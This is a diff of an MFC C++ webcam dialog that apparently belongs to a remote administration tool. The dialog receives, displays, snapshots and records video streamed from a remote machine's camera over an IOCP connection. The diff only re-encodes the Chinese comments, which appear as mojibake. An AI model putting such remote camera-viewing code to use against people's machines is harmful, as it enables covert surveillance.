@@ -1,4 +1,4 @@
-ï»¿// WebCamDlg.cpp : implementation file
+// WebCamDlg.cpp : implementation file
 //
 
 #include "stdafx.h"
@@ -13,10 +13,10 @@ static char THIS_FILE[] = __FILE__;
 
 enum
 {
-	IDM_ENABLECOMPRESS = 0x0010,	// è§†é¢‘å‹ç¼©
-	IDM_SAVEDIB,					// ä¿å­˜å¿«ç…§
-	IDM_SAVEAVI,					// ä¿å­˜å½•åƒ
-	IDM_SIZE_176_144,				// è§†é¢‘åˆ†è¾¨ç‡, H263åªæ”¯æŒè¿™ä¸¤ç§
+	IDM_ENABLECOMPRESS = 0x0010,	// ÊÓÆµÑ¹Ëõ
+	IDM_SAVEDIB,					// ±£´æ¿ìÕÕ
+	IDM_SAVEAVI,					// ±£´æÂ¼Ïñ
+	IDM_SIZE_176_144,				// ÊÓÆµ·Ö±æÂÊ, H263Ö»Ö§³ÖÕâÁ½ÖÖ
 	IDM_SIZE_320_240,
 	IDM_SIZE_352_288
 };
@@ -96,7 +96,7 @@ END_MESSAGE_MAP()
 void CWebCamDlg::OnReceive()
 {
 // 	CString str;
-// 	str.Format(_T("\\\\%s %d * %d ç¬¬%då¸§ %d%%"), m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight,
+// 	str.Format(_T("\\\\%s %d * %d µÚ%dÖ¡ %d%%"), m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight,
 // 		m_nCount, m_pContext->m_nTransferProgress);
 // 	SetWindowText(str);	
 }
@@ -109,11 +109,11 @@ void CWebCamDlg::OnReceiveComplete()
 	case TOKEN_WEBCAM_DIB:
 		DrawDIB();
 		break;
-	case TOKEN_WEBCAM_BITMAPINFO: // è§†é¢‘å¤§å°è°ƒæ•´æˆåŠŸ
+	case TOKEN_WEBCAM_BITMAPINFO: // ÊÓÆµ´óĞ¡µ÷Õû³É¹¦
 		ResetScreen();
 		break;
 	default:
-		// ä¼ è¾“å‘ç”Ÿå¼‚å¸¸æ•°æ®
+		// ´«Êä·¢ÉúÒì³£Êı¾İ
 		SendException();
 		break;
 	}
@@ -135,7 +135,7 @@ bool CWebCamDlg::SaveSnapshot()
 		return false;
 	}
 	
-	// BITMAPINFOå¤§å°
+	// BITMAPINFO´óĞ¡
 //	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
 	
 	// Fill in the fields of the file header
@@ -206,7 +206,7 @@ BOOL CWebCamDlg::PreTranslateMessage(MSG* pMsg)
 
 LRESULT	CWebCamDlg::OnGetMiniMaxInfo(WPARAM wParam, LPARAM lparam)
 {	
-	// å¦‚æœm_MMIå·²ç»è¢«èµ‹å€¼
+	// Èç¹ûm_MMIÒÑ¾­±»¸³Öµ
 	if (m_MMI.ptMaxSize.x > 0)
 		memcpy((void *)lparam, &m_MMI, sizeof(MINMAXINFO));
 	
@@ -219,34 +219,34 @@ void CWebCamDlg::InitMMI()
 	GetWindowRect(&rectWindow);
 	GetClientRect(&rectClient);
 	ClientToScreen(&rectClient);
-	// è¾¹æ¡†çš„å®½åº¦
+	// ±ß¿òµÄ¿í¶È
 	int	nBorderWidth = rectClient.left - rectWindow.left;
 	
 	rectWindow.right = rectClient.left + nBorderWidth + m_lpbmi->bmiHeader.biWidth;
 	rectWindow.bottom = rectClient.top + nBorderWidth + m_lpbmi->bmiHeader.biHeight;
 
-	// è°ƒæ•´çª—å£åˆ°è¿œç¨‹å¤§å°
+	// µ÷Õû´°¿Úµ½Ô¶³Ì´óĞ¡
  	MoveWindow(&rectWindow);
 
-	int	nTitleWidth = rectClient.top - rectWindow.top; // æ ‡é¢˜æ çš„é«˜åº¦
+	int	nTitleWidth = rectClient.top - rectWindow.top; // ±êÌâÀ¸µÄ¸ß¶È
 	int	nWidthAdd = nBorderWidth * 2;
 	int	nHeightAdd = nTitleWidth + nBorderWidth;
 
 	int	nMaxWidth = GetSystemMetrics(SM_CXSCREEN);
 	int	nMaxHeight = GetSystemMetrics(SM_CYSCREEN);
-	// æœ€å°çš„Trackå°ºå¯¸
+	// ×îĞ¡µÄTrack³ß´ç
 	m_MMI.ptMinTrackSize.x = m_lpbmi->bmiHeader.biWidth + nWidthAdd;
 	m_MMI.ptMinTrackSize.y = m_lpbmi->bmiHeader.biHeight + nHeightAdd;
 
 
-	// æœ€å¤§åŒ–æ—¶çª—å£çš„ä½ç½®
+	// ×î´ó»¯Ê±´°¿ÚµÄÎ»ÖÃ
 	m_MMI.ptMaxPosition.x = 1;
 	m_MMI.ptMaxPosition.y = 1;
-	// çª—å£æœ€å¤§å°ºå¯¸
+	// ´°¿Ú×î´ó³ß´ç
 	m_MMI.ptMaxSize.x = nMaxWidth;
 	m_MMI.ptMaxSize.y = nMaxHeight;
 	
-	// æœ€å¤§çš„Trackå°ºå¯¸ä¹Ÿè¦æ”¹å˜
+	// ×î´óµÄTrack³ß´çÒ²Òª¸Ä±ä
 	m_MMI.ptMaxTrackSize.x = nMaxWidth;
 	m_MMI.ptMaxTrackSize.y = nMaxHeight;
 
@@ -255,9 +255,9 @@ void CWebCamDlg::InitMMI()
 void CWebCamDlg::OnClose() 
 {
 	// TODO: Add your message handler code here and/or call default
-	// é”€æ¯æ—¶ç§»é™¤è‡ªå·±åœ¨è§†å›¾ä¸­çš„æ•°æ®
+	// Ïú»ÙÊ±ÒÆ³ı×Ô¼ºÔÚÊÓÍ¼ÖĞµÄÊı¾İ
 
-	// å¦‚æœæ­£åœ¨å½•åƒï¼Œåœæ­¢
+	// Èç¹ûÕıÔÚÂ¼Ïñ£¬Í£Ö¹
 	if (!m_aviFile.IsEmpty())
 		SaveAvi();
 
@@ -295,8 +295,8 @@ BOOL CWebCamDlg::OnInitDialog()
 	CMenu* pSysMenu = GetSystemMenu(FALSE);
 	if (pSysMenu != NULL)
 	{
-		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, _T("ä¿å­˜å¿«ç…§(&S)"));//æ·»åŠ å³å‡»èœå•
-		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI, _T("å½•åˆ¶è§†é¢‘(&R)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, _T("±£´æ¿ìÕÕ(&S)"));//Ìí¼ÓÓÒ»÷²Ëµ¥
+		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI, _T("Â¼ÖÆÊÓÆµ(&R)"));
 		pSysMenu->AppendMenu(MF_SEPARATOR);	
 		Device_head = m_deviceList;
 		for (int i = 0; i < m_nDeviceNums; i++)
@@ -350,7 +350,7 @@ BOOL CWebCamDlg::OnInitDialog()
 			pSysMenu->InsertMenu(-1,MF_STRING|MF_POPUP|MF_BYPOSITION,(UINT)SubMenu.m_hMenu,CString(Device_head));
 			Device_head = Device_end + 1;
 		}
-		// ä¸æ”¯æŒå›ºå®šçš„å¤§å°ï¼Œè¯´æ˜è¿œç¨‹è§†é¢‘æœ‰å›ºå®šçš„å¤§å°ï¼Œè°ƒæ•´å‘½ä»¤å¤±æ•ˆ 
+		// ²»Ö§³Ö¹Ì¶¨µÄ´óĞ¡£¬ËµÃ÷Ô¶³ÌÊÓÆµÓĞ¹Ì¶¨µÄ´óĞ¡£¬µ÷ÕûÃüÁîÊ§Ğ§ 
 // 		if ((m_lpbmi->bmiHeader.biWidth != 352 && m_lpbmi->bmiHeader.biHeight != 288)
 // 			&& (m_lpbmi->bmiHeader.biWidth != 176 && m_lpbmi->bmiHeader.biHeight != 144)
 // 			&& (m_lpbmi->bmiHeader.biWidth != 320 && m_lpbmi->bmiHeader.biHeight != 240))
@@ -367,7 +367,7 @@ BOOL CWebCamDlg::OnInitDialog()
 	CString str;
 	str.Format(_T("\\\\%s (%d * %d)"), m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
 	SetWindowText(str);
-	// åˆå§‹åŒ–çª—å£å¤§å°ç»“æ„
+	// ³õÊ¼»¯´°¿Ú´óĞ¡½á¹¹
 	InitMMI();
 
 	m_hDD = DrawDibOpen();
@@ -378,7 +378,7 @@ BOOL CWebCamDlg::OnInitDialog()
 		m_pXvidDec->Open(m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, m_lpbmi->bmiHeader.biBitCount);
 	}
 
-	// é€šçŸ¥è¿œç¨‹æ§åˆ¶ç«¯å¯¹è¯æ¡†å·²ç»æ‰“å¼€
+	// Í¨ÖªÔ¶³Ì¿ØÖÆ¶Ë¶Ô»°¿òÒÑ¾­´ò¿ª
 	BYTE bToken = COMMAND_NEXT;
 	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
 
@@ -462,9 +462,9 @@ void CWebCamDlg::DrawDIB()
 
 	LPBYTE	lpBuffer = m_pContext->m_DeCompressionBuffer.GetBuffer();
 	UINT	nBufferLen = m_pContext->m_DeCompressionBuffer.GetBufferLen();
-	if (lpBuffer[1] == 0) // æ²¡æœ‰ç»è¿‡H263å‹ç¼©çš„åŸå§‹æ•°æ®ï¼Œä¸éœ€è¦è§£ç 
+	if (lpBuffer[1] == 0) // Ã»ÓĞ¾­¹ıH263Ñ¹ËõµÄÔ­Ê¼Êı¾İ£¬²»ĞèÒª½âÂë
 	{
-		// ç¬¬ä¸€æ¬¡ï¼Œæ²¡æœ‰å‹ç¼©ï¼Œè¯´æ˜æœåŠ¡ç«¯ä¸æ”¯æŒæŒ‡å®šçš„è§£ç å™¨
+		// µÚÒ»´Î£¬Ã»ÓĞÑ¹Ëõ£¬ËµÃ÷·şÎñ¶Ë²»Ö§³ÖÖ¸¶¨µÄ½âÂëÆ÷
 // 		if (m_nCount == 1)
 // 		{
 // 			pSysMenu->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
@@ -472,7 +472,7 @@ void CWebCamDlg::DrawDIB()
 // 		pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_UNCHECKED);
 
 
-		// å†™å…¥å½•åƒæ–‡ä»¶
+		// Ğ´ÈëÂ¼ÏñÎÄ¼ş
 		if (m_bReset && m_bRecord)
 		{
 			m_aviStream.Write(lpBuffer + nHeadLen,nBufferLen - nHeadLen);
@@ -483,7 +483,7 @@ void CWebCamDlg::DrawDIB()
 			DoPaint();
 		}
 	}
-	else // è§£ç 
+	else // ½âÂë
 	{
 // 		InitCodec(*(LPDWORD)(lpBuffer + 2));
 // 		if (m_pVideoCodec != NULL)
@@ -506,9 +506,9 @@ void CWebCamDlg::DrawDIB()
 // 	if (!m_pVideoCodec->InitCompressor(m_lpbmi, fccHandler))
 // 	{
 // 		delete m_pVideoCodec;
-// 		// ç½®NULL, å‘é€æ—¶åˆ¤æ–­æ˜¯å¦ä¸ºNULLæ¥åˆ¤æ–­æ˜¯å¦å‹ç¼©
+// 		// ÖÃNULL, ·¢ËÍÊ±ÅĞ¶ÏÊÇ·ñÎªNULLÀ´ÅĞ¶ÏÊÇ·ñÑ¹Ëõ
 // 		m_pVideoCodec = NULL;
-// 		// é€šçŸ¥æœåŠ¡ç«¯ä¸å¯ç”¨å‹ç¼©
+// 		// Í¨Öª·şÎñ¶Ë²»ÆôÓÃÑ¹Ëõ
 // 		BYTE bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
 // 		m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
 // 		GetSystemMenu(FALSE)->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
@@ -520,7 +520,7 @@ bool CWebCamDlg::SendResetScreen(int nWidth, int nHeight)
 	if (GetSystemMenu(FALSE)->GetMenuState(IDM_SAVEAVI, MF_BYCOMMAND) & MF_CHECKED)
 	{
 //		MessageBox(_T("Please Stop Recording .."),_T("Logion"));
-		MessageBox(_T("åœæ­¢å½•åˆ¶è§†é¢‘ä¸­..."),_T("æç¤º"));
+		MessageBox(_T("Í£Ö¹Â¼ÖÆÊÓÆµÖĞ..."),_T("ÌáÊ¾"));
 		return false;
 	}
 	m_width = nWidth;
@@ -608,14 +608,14 @@ void CWebCamDlg::PostDecHandler(unsigned char * image, int used_bytes)
 {
 #ifdef MY_TEST
 	#if 0
-		// ç”Ÿæˆå½“å‰è·¯å¾„ä¸‹çš„æ–‡ä»¶å
+		// Éú³Éµ±Ç°Â·¾¶ÏÂµÄÎÄ¼şÃû
 		char m_szFileName[256] = {0};
 		sprintf(m_szFileName, "C:\\testlog\\%d.bmp", GetTickCount()) ; 
-		// ç”Ÿæˆbmpæ–‡ä»¶
+		// Éú³ÉbmpÎÄ¼ş
 		HANDLE hf = CreateFile(
 			m_szFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL,
 			CREATE_ALWAYS, NULL, NULL );
-		// å†™æ–‡ä»¶å¤´ 
+		// Ğ´ÎÄ¼şÍ· 
 		BITMAPFILEHEADER bfh;
 		memset( &bfh, 0, sizeof( bfh ) );
 		bfh.bfType = 'MB';
@@ -623,7 +623,7 @@ void CWebCamDlg::PostDecHandler(unsigned char * image, int used_bytes)
 		bfh.bfOffBits = sizeof( BITMAPINFOHEADER ) + sizeof( BITMAPFILEHEADER );
 		DWORD dwWritten = 0;
 		WriteFile( hf, &bfh, sizeof( bfh ), &dwWritten, NULL );
-		// å†™ä½å›¾æ ¼å¼
+		// Ğ´Î»Í¼¸ñÊ½
 		BITMAPINFOHEADER bih;
 		memset( &bih, 0, sizeof( bih ) );
 		bih.biSize = sizeof( bih );
@@ -632,7 +632,7 @@ void CWebCamDlg::PostDecHandler(unsigned char * image, int used_bytes)
 		bih.biPlanes = 1;
 		bih.biBitCount = 24;
 		WriteFile( hf, &bih, sizeof( bih ), &dwWritten, NULL );
-		// å†™ä½å›¾æ•°æ®
+		// Ğ´Î»Í¼Êı¾İ
 		WriteFile( hf, image, m_lpbmi->bmiHeader.biSizeImage, &dwWritten, NULL );
 		CloseHandle( hf );
 	#endif
@@ -688,12 +688,12 @@ void CWebCamDlg::DoPaint()
  			&m_cDc,0,0,m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight,SRCCOPY);
 #endif
 	
-	LPCTSTR	lpTipsString = _T("å½•åˆ¶è§†é¢‘ä¸­...");//Recording ...
-	// å†™å…¥å½•åƒæ–‡ä»¶
+	LPCTSTR	lpTipsString = _T("Â¼ÖÆÊÓÆµÖĞ...");//Recording ...
+	// Ğ´ÈëÂ¼ÏñÎÄ¼ş
 	if (!m_aviFile.IsEmpty())
 	{
 //		m_aviStream.Write(m_lpScreenDIB);
-		// æç¤ºæ­£åœ¨å½•åƒ
+		// ÌáÊ¾ÕıÔÚÂ¼Ïñ
 		SetBkMode(m_hDC, TRANSPARENT);
 		SetTextColor(m_hDC, RGB(0xff,0x00,0x00));
 		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
@@ -736,12 +736,12 @@ void CWebCamDlg::OnPaint()
 		&m_cDc,0,0,m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight,SRCCOPY);
 #endif
 
-	LPCTSTR	lpTipsString = _T("å½•åˆ¶è§†é¢‘ä¸­...");//Recording ...
-	// å†™å…¥å½•åƒæ–‡ä»¶
+	LPCTSTR	lpTipsString = _T("Â¼ÖÆÊÓÆµÖĞ...");//Recording ...
+	// Ğ´ÈëÂ¼ÏñÎÄ¼ş
 	if (m_bRecord)
 	{
 		//		m_aviStream.Write(m_lpScreenDIB);
-		// æç¤ºæ­£åœ¨å½•åƒ
+		// ÌáÊ¾ÕıÔÚÂ¼Ïñ
 		SetBkMode(m_hDC, TRANSPARENT);
 		SetTextColor(m_hDC, RGB(0xff,0x00,0x00));
 		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
@@ -765,7 +765,7 @@ void CWebCamDlg::OnSize(UINT nType, int cx, int cy)
 	if (!IsWindowVisible())
 		return;
 
-	// æŒ‰æ¯”ä¾‹è°ƒæ•´çª—å£å¤§å°
+	// °´±ÈÀıµ÷Õû´°¿Ú´óĞ¡
 	int	x = m_lpbmi->bmiHeader.biWidth, y = m_lpbmi->bmiHeader.biHeight; // x:y
 
 	RECT	rectClientToScreen, rectClient, rectWindow;
@@ -773,13 +773,13 @@ void CWebCamDlg::OnSize(UINT nType, int cx, int cy)
 	GetClientRect(&rectClient);
 	GetClientRect(&rectClientToScreen);
 	ClientToScreen(&rectClientToScreen);  
-	// è¾¹æ¡†çš„å®½åº¦
+	// ±ß¿òµÄ¿í¶È
 	int	nBorderWidth = rectClientToScreen.left - rectWindow.left;
 
 	int	nWindowWidth = rectWindow.right - rectWindow.left;
 	int	nWindowHeight = rectWindow.bottom - rectWindow.top;
 	
-	// å®½å‘ç”Ÿå˜åŒ–
+	// ¿í·¢Éú±ä»¯
 	if (m_nOldWidth != nWindowWidth)
 		rectWindow.bottom = rectClientToScreen.top + nBorderWidth + (rectClient.right * y) / x;
 	else
@@ -816,7 +816,7 @@ void CWebCamDlg::PostNcDestroy()
 //{
 //	__super::OnDestroy();
 //	
-//	// TODO: åœ¨æ­¤å¤„æ·»åŠ æ¶ˆæ¯å¤„ç†ç¨‹åºä»£ç 
+//	// TODO: ÔÚ´Ë´¦Ìí¼ÓÏûÏ¢´¦Àí³ÌĞò´úÂë
 //}
 
 
@@ -833,5 +833,5 @@ void CWebCamDlg::OnDestroy()
 		delete [] m_lpbmi;
 	if (m_lpScreenDIB)
 		delete [] m_lpScreenDIB;
-	// TODO: åœ¨æ­¤å¤„æ·»åŠ æ¶ˆæ¯å¤„ç†ç¨‹åºä»£ç 
+	// TODO: ÔÚ´Ë´¦Ìí¼ÓÏûÏ¢´¦Àí³ÌĞò´úÂë
 }
